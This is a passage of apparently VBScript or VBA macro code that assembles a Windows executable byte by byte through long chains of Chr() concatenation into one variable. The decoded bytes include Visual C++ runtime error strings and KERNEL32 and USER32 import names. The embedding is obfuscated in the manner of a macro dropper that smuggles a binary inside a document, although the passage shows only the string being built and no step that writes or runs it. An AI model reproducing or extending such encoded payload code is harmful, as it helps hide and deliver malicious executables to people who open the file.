ySXd=ySXd&Chr(200)&Chr(153)&Chr(0)&Chr(0)&Chr(212)&Chr(153)&Chr(0)&Chr(0)&Chr(230)&Chr(153)&Chr(0)&Chr(0)&Chr(242)&Chr(153)&Chr(0)&Chr(0)&Chr(2)&Chr(154)&Chr(0)&Chr(0)&Chr(16)&Chr(154)&Chr(0)&Chr(0)&Chr(28)&Chr(154)&Chr(0)&Chr(0)&Chr(40)&Chr(154)&Chr(0)&Chr(0)&Chr(58)&Chr(154)&Chr(0)&Chr(0)&Chr(74)&Chr(154)&Chr(0)&Chr(0)&Chr(96)&Chr(154)&Chr(0)&Chr(0)&Chr(112)&Chr(154)&Chr(0)&Chr(0)&Chr(130)&Chr(154)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(167)&Chr(44)&Chr(64)&Chr(0)&Chr(5)&Chr(61)&Chr(64)&Chr(0)&Chr(10)&Chr(96)&Chr(64)&Chr(0)&Chr(246)&Chr(17)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(67)&Chr(111)&Chr(114)&Chr(69)&Chr(120)&Chr(105)&Chr(116)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(0)&Chr(0)&Chr(109)&Chr(0)&Chr(115)&Chr(0)&Chr(99)&Chr(0)&Chr(111)&Chr(0)&Chr(114)&Chr(0)&Chr(101)&Chr(0)&Chr(101)&Chr(0)&Chr(46)&Chr(0)&Chr(100)&Chr(0)&Chr(108)&Chr(0)&Chr(108)&Chr(0)&Chr(0)&Chr(0)&Chr(114)&Chr(117)&Chr(110)&Chr(116)&Chr(105)&Chr(109)&Chr(101)&Chr(32)&Chr(101)&Chr(114)&Chr(114)&Chr(111)&Chr(114)&Chr(32)&Chr(0)&Chr(0)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(84)&Chr(76)&Chr(79)&Chr(83)&Chr(83)&Chr(32)&Chr(101)&Chr(114)&Chr(114)&Chr(111)&Chr(114)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(83)&Chr(73)&Chr(78)&Chr(71)&Chr(32)&Chr(101)&Chr(114)&Chr(114)&Chr(111)&Chr(114)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(68)&Chr(79)&Chr(77)&Chr(65)
ySXd=ySXd&Chr(73)&Chr(78)&Chr(32)&Chr(101)&Chr(114)&Chr(114)&Chr(111)&Chr(114)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(51)&Chr(52)&Chr(13)&Chr(10)&Chr(65)&Chr(110)&Chr(32)&Chr(97)&Chr(112)&Chr(112)&Chr(108)&Chr(105)&Chr(99)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(32)&Chr(104)&Chr(97)&Chr(115)&Chr(32)&Chr(109)&Chr(97)&Chr(100)&Chr(101)&Chr(32)&Chr(97)&Chr(110)&Chr(32)&Chr(97)&Chr(116)&Chr(116)&Chr(101)&Chr(109)&Chr(112)&Chr(116)&Chr(32)&Chr(116)&Chr(111)&Chr(32)&Chr(108)&Chr(111)&Chr(97)&Chr(100)&Chr(32)&Chr(116)&Chr(104)&Chr(101)&Chr(32)&Chr(67)&Chr(32)&Chr(114)&Chr(117)&Chr(110)&Chr(116)&Chr(105)&Chr(109)&Chr(101)&Chr(32)&Chr(108)&Chr(105)&Chr(98)&Chr(114)&Chr(97)&Chr(114)&Chr(121)&Chr(32)&Chr(105)&Chr(110)&Chr(99)&Chr(111)&Chr(114)&Chr(114)&Chr(101)&Chr(99)&Chr(116)&Chr(108)&Chr(121)&Chr(46)
ySXd=ySXd&Chr(10)&Chr(80)&Chr(108)&Chr(101)&Chr(97)&Chr(115)&Chr(101)&Chr(32)&Chr(99)&Chr(111)&Chr(110)&Chr(116)&Chr(97)&Chr(99)&Chr(116)&Chr(32)&Chr(116)&Chr(104)&Chr(101)&Chr(32)&Chr(97)&Chr(112)&Chr(112)&Chr(108)&Chr(105)&Chr(99)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(39)&Chr(115)&Chr(32)&Chr(115)&Chr(117)&Chr(112)&Chr(112)&Chr(111)&Chr(114)&Chr(116)&Chr(32)&Chr(116)&Chr(101)&Chr(97)&Chr(109)&Chr(32)&Chr(102)&Chr(111)&Chr(114)&Chr(32)&Chr(109)&Chr(111)&Chr(114)&Chr(101)&Chr(32)&Chr(105)&Chr(110)&Chr(102)&Chr(111)&Chr(114)&Chr(109)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(46)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(51)&Chr(51)&Chr(13)&Chr(10)&Chr(45)&Chr(32)&Chr(65)&Chr(116)&Chr(116)&Chr(101)&Chr(109)&Chr(112)&Chr(116)&Chr(32)&Chr(116)&Chr(111)&Chr(32)&Chr(117)&Chr(115)&Chr(101)&Chr(32)
ySXd=ySXd&Chr(77)&Chr(83)&Chr(73)&Chr(76)&Chr(32)&Chr(99)&Chr(111)&Chr(100)&Chr(101)&Chr(32)&Chr(102)&Chr(114)&Chr(111)&Chr(109)&Chr(32)&Chr(116)&Chr(104)&Chr(105)&Chr(115)&Chr(32)&Chr(97)&Chr(115)&Chr(115)&Chr(101)&Chr(109)&Chr(98)&Chr(108)&Chr(121)&Chr(32)&Chr(100)&Chr(117)&Chr(114)&Chr(105)&Chr(110)&Chr(103)&Chr(32)&Chr(110)&Chr(97)&Chr(116)&Chr(105)&Chr(118)&Chr(101)&Chr(32)&Chr(99)&Chr(111)&Chr(100)&Chr(101)&Chr(32)&Chr(105)&Chr(110)&Chr(105)&Chr(116)&Chr(105)&Chr(97)&Chr(108)&Chr(105)&Chr(122)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(10)&Chr(84)&Chr(104)&Chr(105)&Chr(115)&Chr(32)&Chr(105)&Chr(110)&Chr(100)&Chr(105)&Chr(99)&Chr(97)&Chr(116)&Chr(101)&Chr(115)&Chr(32)&Chr(97)&Chr(32)&Chr(98)&Chr(117)&Chr(103)&Chr(32)&Chr(105)&Chr(110)&Chr(32)&Chr(121)&Chr(111)&Chr(117)&Chr(114)&Chr(32)&Chr(97)&Chr(112)&Chr(112)&Chr(108)&Chr(105)&Chr(99)&Chr(97)&Chr(116)
ySXd=ySXd&Chr(105)&Chr(111)&Chr(110)&Chr(46)&Chr(32)&Chr(73)&Chr(116)&Chr(32)&Chr(105)&Chr(115)&Chr(32)&Chr(109)&Chr(111)&Chr(115)&Chr(116)&Chr(32)&Chr(108)&Chr(105)&Chr(107)&Chr(101)&Chr(108)&Chr(121)&Chr(32)&Chr(116)&Chr(104)&Chr(101)&Chr(32)&Chr(114)&Chr(101)&Chr(115)&Chr(117)&Chr(108)&Chr(116)&Chr(32)&Chr(111)&Chr(102)&Chr(32)&Chr(99)&Chr(97)&Chr(108)&Chr(108)&Chr(105)&Chr(110)&Chr(103)&Chr(32)&Chr(97)&Chr(110)&Chr(32)&Chr(77)&Chr(83)&Chr(73)&Chr(76)&Chr(45)&Chr(99)&Chr(111)&Chr(109)&Chr(112)&Chr(105)&Chr(108)&Chr(101)&Chr(100)&Chr(32)&Chr(40)&Chr(47)&Chr(99)&Chr(108)&Chr(114)&Chr(41)&Chr(32)&Chr(102)&Chr(117)&Chr(110)&Chr(99)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(32)&Chr(102)&Chr(114)&Chr(111)&Chr(109)&Chr(32)&Chr(97)&Chr(32)&Chr(110)&Chr(97)&Chr(116)&Chr(105)&Chr(118)&Chr(101)&Chr(32)&Chr(99)&Chr(111)&Chr(110)&Chr(115)&Chr(116)&Chr(114)&Chr(117)&Chr(99)
ySXd=ySXd&Chr(116)&Chr(111)&Chr(114)&Chr(32)&Chr(111)&Chr(114)&Chr(32)&Chr(102)&Chr(114)&Chr(111)&Chr(109)&Chr(32)&Chr(68)&Chr(108)&Chr(108)&Chr(77)&Chr(97)&Chr(105)&Chr(110)&Chr(46)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(51)&Chr(50)&Chr(13)&Chr(10)&Chr(45)&Chr(32)&Chr(110)&Chr(111)&Chr(116)&Chr(32)&Chr(101)&Chr(110)&Chr(111)&Chr(117)&Chr(103)&Chr(104)&Chr(32)&Chr(115)&Chr(112)&Chr(97)&Chr(99)&Chr(101)&Chr(32)&Chr(102)&Chr(111)&Chr(114)&Chr(32)&Chr(108)&Chr(111)&Chr(99)&Chr(97)&Chr(108)&Chr(101)&Chr(32)&Chr(105)&Chr(110)&Chr(102)&Chr(111)&Chr(114)&Chr(109)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(51)&Chr(49)&Chr(13)&Chr(10)&Chr(45)&Chr(32)&Chr(65)&Chr(116)&Chr(116)&Chr(101)&Chr(109)&Chr(112)&Chr(116)&Chr(32)&Chr(116)&Chr(111)&Chr(32)
ySXd=ySXd&Chr(105)&Chr(110)&Chr(105)&Chr(116)&Chr(105)&Chr(97)&Chr(108)&Chr(105)&Chr(122)&Chr(101)&Chr(32)&Chr(116)&Chr(104)&Chr(101)&Chr(32)&Chr(67)&Chr(82)&Chr(84)&Chr(32)&Chr(109)&Chr(111)&Chr(114)&Chr(101)&Chr(32)&Chr(116)&Chr(104)&Chr(97)&Chr(110)&Chr(32)&Chr(111)&Chr(110)&Chr(99)&Chr(101)&Chr(46)&Chr(10)&Chr(84)&Chr(104)&Chr(105)&Chr(115)&Chr(32)&Chr(105)&Chr(110)&Chr(100)&Chr(105)&Chr(99)&Chr(97)&Chr(116)&Chr(101)&Chr(115)&Chr(32)&Chr(97)&Chr(32)&Chr(98)&Chr(117)&Chr(103)&Chr(32)&Chr(105)&Chr(110)&Chr(32)&Chr(121)&Chr(111)&Chr(117)&Chr(114)&Chr(32)&Chr(97)&Chr(112)&Chr(112)&Chr(108)&Chr(105)&Chr(99)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(46)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(51)&Chr(48)&Chr(13)&Chr(10)&Chr(45)&Chr(32)&Chr(67)&Chr(82)&Chr(84)&Chr(32)&Chr(110)&Chr(111)&Chr(116)&Chr(32)&Chr(105)&Chr(110)&Chr(105)
ySXd=ySXd&Chr(116)&Chr(105)&Chr(97)&Chr(108)&Chr(105)&Chr(122)&Chr(101)&Chr(100)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(50)&Chr(56)&Chr(13)&Chr(10)&Chr(45)&Chr(32)&Chr(117)&Chr(110)&Chr(97)&Chr(98)&Chr(108)&Chr(101)&Chr(32)&Chr(116)&Chr(111)&Chr(32)&Chr(105)&Chr(110)&Chr(105)&Chr(116)&Chr(105)&Chr(97)&Chr(108)&Chr(105)&Chr(122)&Chr(101)&Chr(32)&Chr(104)&Chr(101)&Chr(97)&Chr(112)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(50)&Chr(55)&Chr(13)&Chr(10)&Chr(45)&Chr(32)&Chr(110)&Chr(111)&Chr(116)&Chr(32)&Chr(101)&Chr(110)&Chr(111)&Chr(117)&Chr(103)&Chr(104)&Chr(32)&Chr(115)&Chr(112)&Chr(97)&Chr(99)&Chr(101)&Chr(32)&Chr(102)&Chr(111)&Chr(114)&Chr(32)&Chr(108)&Chr(111)&Chr(119)&Chr(105)&Chr(111)&Chr(32)&Chr(105)&Chr(110)&Chr(105)&Chr(116)&Chr(105)&Chr(97)&Chr(108)&Chr(105)&Chr(122)&Chr(97)&Chr(116)&Chr(105)
ySXd=ySXd&Chr(111)&Chr(110)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(50)&Chr(54)&Chr(13)&Chr(10)&Chr(45)&Chr(32)&Chr(110)&Chr(111)&Chr(116)&Chr(32)&Chr(101)&Chr(110)&Chr(111)&Chr(117)&Chr(103)&Chr(104)&Chr(32)&Chr(115)&Chr(112)&Chr(97)&Chr(99)&Chr(101)&Chr(32)&Chr(102)&Chr(111)&Chr(114)&Chr(32)&Chr(115)&Chr(116)&Chr(100)&Chr(105)&Chr(111)&Chr(32)&Chr(105)&Chr(110)&Chr(105)&Chr(116)&Chr(105)&Chr(97)&Chr(108)&Chr(105)&Chr(122)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(50)&Chr(53)&Chr(13)&Chr(10)&Chr(45)&Chr(32)&Chr(112)&Chr(117)&Chr(114)&Chr(101)&Chr(32)&Chr(118)&Chr(105)&Chr(114)&Chr(116)&Chr(117)&Chr(97)&Chr(108)&Chr(32)&Chr(102)&Chr(117)&Chr(110)&Chr(99)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(32)&Chr(99)&Chr(97)&Chr(108)&Chr(108)&Chr(13)
ySXd=ySXd&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(50)&Chr(52)&Chr(13)&Chr(10)&Chr(45)&Chr(32)&Chr(110)&Chr(111)&Chr(116)&Chr(32)&Chr(101)&Chr(110)&Chr(111)&Chr(117)&Chr(103)&Chr(104)&Chr(32)&Chr(115)&Chr(112)&Chr(97)&Chr(99)&Chr(101)&Chr(32)&Chr(102)&Chr(111)&Chr(114)&Chr(32)&Chr(95)&Chr(111)&Chr(110)&Chr(101)&Chr(120)&Chr(105)&Chr(116)&Chr(47)&Chr(97)&Chr(116)&Chr(101)&Chr(120)&Chr(105)&Chr(116)&Chr(32)&Chr(116)&Chr(97)&Chr(98)&Chr(108)&Chr(101)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(49)&Chr(57)&Chr(13)&Chr(10)&Chr(45)&Chr(32)&Chr(117)&Chr(110)&Chr(97)&Chr(98)&Chr(108)&Chr(101)&Chr(32)&Chr(116)&Chr(111)&Chr(32)&Chr(111)&Chr(112)&Chr(101)&Chr(110)&Chr(32)&Chr(99)&Chr(111)&Chr(110)&Chr(115)&Chr(111)&Chr(108)&Chr(101)&Chr(32)&Chr(100)&Chr(101)&Chr(118)&Chr(105)&Chr(99)&Chr(101)&Chr(13)&Chr(10)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(49)&Chr(56)&Chr(13)&Chr(10)&Chr(45)&Chr(32)&Chr(117)&Chr(110)&Chr(101)&Chr(120)&Chr(112)&Chr(101)&Chr(99)&Chr(116)&Chr(101)&Chr(100)&Chr(32)&Chr(104)&Chr(101)&Chr(97)&Chr(112)&Chr(32)&Chr(101)&Chr(114)&Chr(114)&Chr(111)&Chr(114)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(49)&Chr(55)&Chr(13)&Chr(10)&Chr(45)&Chr(32)&Chr(117)&Chr(110)&Chr(101)&Chr(120)&Chr(112)&Chr(101)&Chr(99)&Chr(116)&Chr(101)&Chr(100)&Chr(32)&Chr(109)&Chr(117)&Chr(108)&Chr(116)&Chr(105)&Chr(116)&Chr(104)&Chr(114)&Chr(101)&Chr(97)&Chr(100)&Chr(32)&Chr(108)&Chr(111)&Chr(99)&Chr(107)&Chr(32)&Chr(101)&Chr(114)&Chr(114)&Chr(111)&Chr(114)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(49)&Chr(54)&Chr(13)&Chr(10)&Chr(45)&Chr(32)&Chr(110)&Chr(111)&Chr(116)
ySXd=ySXd&Chr(32)&Chr(101)&Chr(110)&Chr(111)&Chr(117)&Chr(103)&Chr(104)&Chr(32)&Chr(115)&Chr(112)&Chr(97)&Chr(99)&Chr(101)&Chr(32)&Chr(102)&Chr(111)&Chr(114)&Chr(32)&Chr(116)&Chr(104)&Chr(114)&Chr(101)&Chr(97)&Chr(100)&Chr(32)&Chr(100)&Chr(97)&Chr(116)&Chr(97)&Chr(13)&Chr(10)&Chr(0)&Chr(13)&Chr(10)&Chr(84)&Chr(104)&Chr(105)&Chr(115)&Chr(32)&Chr(97)&Chr(112)&Chr(112)&Chr(108)&Chr(105)&Chr(99)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(32)&Chr(104)&Chr(97)&Chr(115)&Chr(32)&Chr(114)&Chr(101)&Chr(113)&Chr(117)&Chr(101)&Chr(115)&Chr(116)&Chr(101)&Chr(100)&Chr(32)&Chr(116)&Chr(104)&Chr(101)&Chr(32)&Chr(82)&Chr(117)&Chr(110)&Chr(116)&Chr(105)&Chr(109)&Chr(101)&Chr(32)&Chr(116)&Chr(111)&Chr(32)&Chr(116)&Chr(101)&Chr(114)&Chr(109)&Chr(105)&Chr(110)&Chr(97)&Chr(116)&Chr(101)&Chr(32)&Chr(105)&Chr(116)&Chr(32)&Chr(105)&Chr(110)&Chr(32)&Chr(97)&Chr(110)&Chr(32)&Chr(117)
ySXd=ySXd&Chr(110)&Chr(117)&Chr(115)&Chr(117)&Chr(97)&Chr(108)&Chr(32)&Chr(119)&Chr(97)&Chr(121)&Chr(46)&Chr(10)&Chr(80)&Chr(108)&Chr(101)&Chr(97)&Chr(115)&Chr(101)&Chr(32)&Chr(99)&Chr(111)&Chr(110)&Chr(116)&Chr(97)&Chr(99)&Chr(116)&Chr(32)&Chr(116)&Chr(104)&Chr(101)&Chr(32)&Chr(97)&Chr(112)&Chr(112)&Chr(108)&Chr(105)&Chr(99)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(39)&Chr(115)&Chr(32)&Chr(115)&Chr(117)&Chr(112)&Chr(112)&Chr(111)&Chr(114)&Chr(116)&Chr(32)&Chr(116)&Chr(101)&Chr(97)&Chr(109)&Chr(32)&Chr(102)&Chr(111)&Chr(114)&Chr(32)&Chr(109)&Chr(111)&Chr(114)&Chr(101)&Chr(32)&Chr(105)&Chr(110)&Chr(102)&Chr(111)&Chr(114)&Chr(109)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(46)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(48)&Chr(57)&Chr(13)&Chr(10)&Chr(45)&Chr(32)&Chr(110)&Chr(111)&Chr(116)&Chr(32)&Chr(101)&Chr(110)&Chr(111)
ySXd=ySXd&Chr(117)&Chr(103)&Chr(104)&Chr(32)&Chr(115)&Chr(112)&Chr(97)&Chr(99)&Chr(101)&Chr(32)&Chr(102)&Chr(111)&Chr(114)&Chr(32)&Chr(101)&Chr(110)&Chr(118)&Chr(105)&Chr(114)&Chr(111)&Chr(110)&Chr(109)&Chr(101)&Chr(110)&Chr(116)&Chr(13)&Chr(10)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(48)&Chr(56)&Chr(13)&Chr(10)&Chr(45)&Chr(32)&Chr(110)&Chr(111)&Chr(116)&Chr(32)&Chr(101)&Chr(110)&Chr(111)&Chr(117)&Chr(103)&Chr(104)&Chr(32)&Chr(115)&Chr(112)&Chr(97)&Chr(99)&Chr(101)&Chr(32)&Chr(102)&Chr(111)&Chr(114)&Chr(32)&Chr(97)&Chr(114)&Chr(103)&Chr(117)&Chr(109)&Chr(101)&Chr(110)&Chr(116)&Chr(115)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(82)&Chr(54)&Chr(48)&Chr(48)&Chr(50)&Chr(13)&Chr(10)&Chr(45)&Chr(32)&Chr(102)&Chr(108)&Chr(111)&Chr(97)&Chr(116)&Chr(105)&Chr(110)&Chr(103)&Chr(32)&Chr(112)&Chr(111)&Chr(105)&Chr(110)&Chr(116)&Chr(32)&Chr(115)&Chr(117)&Chr(112)&Chr(112)
ySXd=ySXd&Chr(111)&Chr(114)&Chr(116)&Chr(32)&Chr(110)&Chr(111)&Chr(116)&Chr(32)&Chr(108)&Chr(111)&Chr(97)&Chr(100)&Chr(101)&Chr(100)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(77)&Chr(105)&Chr(99)&Chr(114)&Chr(111)&Chr(115)&Chr(111)&Chr(102)&Chr(116)&Chr(32)&Chr(86)&Chr(105)&Chr(115)&Chr(117)&Chr(97)&Chr(108)&Chr(32)&Chr(67)&Chr(43)&Chr(43)&Chr(32)&Chr(82)&Chr(117)&Chr(110)&Chr(116)&Chr(105)&Chr(109)&Chr(101)&Chr(32)&Chr(76)&Chr(105)&Chr(98)&Chr(114)&Chr(97)&Chr(114)&Chr(121)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(10)&Chr(10)&Chr(0)&Chr(0)&Chr(46)&Chr(46)&Chr(46)&Chr(0)&Chr(60)&Chr(112)&Chr(114)&Chr(111)&Chr(103)&Chr(114)&Chr(97)&Chr(109)&Chr(32)&Chr(110)&Chr(97)&Chr(109)&Chr(101)&Chr(32)&Chr(117)&Chr(110)&Chr(107)&Chr(110)&Chr(111)&Chr(119)&Chr(110)&Chr(62)&Chr(0)&Chr(0)&Chr(82)&Chr(117)&Chr(110)&Chr(116)&Chr(105)&Chr(109)&Chr(101)&Chr(32)
ySXd=ySXd&Chr(69)&Chr(114)&Chr(114)&Chr(111)&Chr(114)&Chr(33)&Chr(10)&Chr(10)&Chr(80)&Chr(114)&Chr(111)&Chr(103)&Chr(114)&Chr(97)&Chr(109)&Chr(58)&Chr(32)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(5)&Chr(0)&Chr(0)&Chr(192)&Chr(11)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(29)&Chr(0)&Chr(0)&Chr(192)&Chr(4)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(150)&Chr(0)&Chr(0)&Chr(192)&Chr(4)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(141)&Chr(0)&Chr(0)&Chr(192)&Chr(8)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(142)&Chr(0)&Chr(0)&Chr(192)&Chr(8)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(143)&Chr(0)&Chr(0)&Chr(192)&Chr(8)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(144)&Chr(0)&Chr(0)&Chr(192)
ySXd=ySXd&Chr(8)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(145)&Chr(0)&Chr(0)&Chr(192)&Chr(8)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(146)&Chr(0)&Chr(0)&Chr(192)&Chr(8)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(147)&Chr(0)&Chr(0)&Chr(192)&Chr(8)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(69)&Chr(110)&Chr(99)&Chr(111)&Chr(100)&Chr(101)&Chr(80)&Chr(111)&Chr(105)&Chr(110)&Chr(116)&Chr(101)&Chr(114)&Chr(0)&Chr(0)&Chr(0)&Chr(75)&Chr(0)&Chr(69)&Chr(0)&Chr(82)&Chr(0)&Chr(78)&Chr(0)&Chr(69)&Chr(0)&Chr(76)&Chr(0)&Chr(51)&Chr(0)&Chr(50)&Chr(0)&Chr(46)&Chr(0)&Chr(68)&Chr(0)&Chr(76)&Chr(0)&Chr(76)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(68)&Chr(101)&Chr(99)&Chr(111)&Chr(100)&Chr(101)&Chr(80)&Chr(111)
ySXd=ySXd&Chr(105)&Chr(110)&Chr(116)&Chr(101)&Chr(114)&Chr(0)&Chr(0)&Chr(0)&Chr(70)&Chr(108)&Chr(115)&Chr(70)&Chr(114)&Chr(101)&Chr(101)&Chr(0)&Chr(70)&Chr(108)&Chr(115)&Chr(83)&Chr(101)&Chr(116)&Chr(86)&Chr(97)&Chr(108)&Chr(117)&Chr(101)&Chr(0)&Chr(70)&Chr(108)&Chr(115)&Chr(71)&Chr(101)&Chr(116)&Chr(86)&Chr(97)&Chr(108)&Chr(117)&Chr(101)&Chr(0)&Chr(70)&Chr(108)&Chr(115)&Chr(65)&Chr(108)&Chr(108)&Chr(111)&Chr(99)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(71)&Chr(101)&Chr(116)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(87)&Chr(105)&Chr(110)&Chr(100)&Chr(111)&Chr(119)&Chr(83)&Chr(116)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(0)&Chr(71)&Chr(101)&Chr(116)&Chr(85)&Chr(115)&Chr(101)&Chr(114)&Chr(79)&Chr(98)&Chr(106)&Chr(101)&Chr(99)&Chr(116)&Chr(73)&Chr(110)&Chr(102)&Chr(111)&Chr(114)&Chr(109)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)
ySXd=ySXd&Chr(65)&Chr(0)&Chr(0)&Chr(0)&Chr(71)&Chr(101)&Chr(116)&Chr(76)&Chr(97)&Chr(115)&Chr(116)&Chr(65)&Chr(99)&Chr(116)&Chr(105)&Chr(118)&Chr(101)&Chr(80)&Chr(111)&Chr(112)&Chr(117)&Chr(112)&Chr(0)&Chr(0)&Chr(71)&Chr(101)&Chr(116)&Chr(65)&Chr(99)&Chr(116)&Chr(105)&Chr(118)&Chr(101)&Chr(87)&Chr(105)&Chr(110)&Chr(100)&Chr(111)&Chr(119)&Chr(0)&Chr(77)&Chr(101)&Chr(115)&Chr(115)&Chr(97)&Chr(103)&Chr(101)&Chr(66)&Chr(111)&Chr(120)&Chr(65)&Chr(0)&Chr(85)&Chr(83)&Chr(69)&Chr(82)&Chr(51)&Chr(50)&Chr(46)&Chr(68)&Chr(76)&Chr(76)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(2)&Chr(3)&Chr(4)&Chr(5)&Chr(6)&Chr(7)&Chr(8)&Chr(9)&Chr(10)&Chr(11)&Chr(12)&Chr(13)&Chr(14)&Chr(15)&Chr(16)&Chr(17)&Chr(18)&Chr(19)&Chr(20)&Chr(21)&Chr(22)&Chr(23)&Chr(24)&Chr(25)&Chr(26)&Chr(27)&Chr(28)&Chr(29)&Chr(30)&Chr(31)&Chr(32)
ySXd=ySXd&Chr(33)&Chr(34)&Chr(35)&Chr(36)&Chr(37)&Chr(38)&Chr(39)&Chr(40)&Chr(41)&Chr(42)&Chr(43)&Chr(44)&Chr(45)&Chr(46)&Chr(47)&Chr(48)&Chr(49)&Chr(50)&Chr(51)&Chr(52)&Chr(53)&Chr(54)&Chr(55)&Chr(56)&Chr(57)&Chr(58)&Chr(59)&Chr(60)&Chr(61)&Chr(62)&Chr(63)&Chr(64)&Chr(65)&Chr(66)&Chr(67)&Chr(68)&Chr(69)&Chr(70)&Chr(71)&Chr(72)&Chr(73)&Chr(74)&Chr(75)&Chr(76)&Chr(77)&Chr(78)&Chr(79)&Chr(80)&Chr(81)&Chr(82)&Chr(83)&Chr(84)&Chr(85)&Chr(86)&Chr(87)&Chr(88)&Chr(89)&Chr(90)&Chr(91)&Chr(92)&Chr(93)&Chr(94)&Chr(95)&Chr(96)&Chr(97)&Chr(98)&Chr(99)&Chr(100)&Chr(101)&Chr(102)&Chr(103)&Chr(104)&Chr(105)&Chr(106)&Chr(107)&Chr(108)&Chr(109)&Chr(110)&Chr(111)&Chr(112)&Chr(113)&Chr(114)&Chr(115)&Chr(116)&Chr(117)&Chr(118)&Chr(119)&Chr(120)&Chr(121)&Chr(122)&Chr(123)&Chr(124)&Chr(125)&Chr(126)&Chr(127)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
